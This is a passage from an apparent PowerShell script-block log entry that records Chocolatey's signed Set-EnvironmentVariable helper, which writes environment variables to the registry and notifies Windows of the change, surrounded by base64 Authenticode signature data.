NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Set-EnvironmentVariable.ps1 ¦ ScriptBlockId: 7904229b-0650-4136-8922-88e2d70ceba3 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # 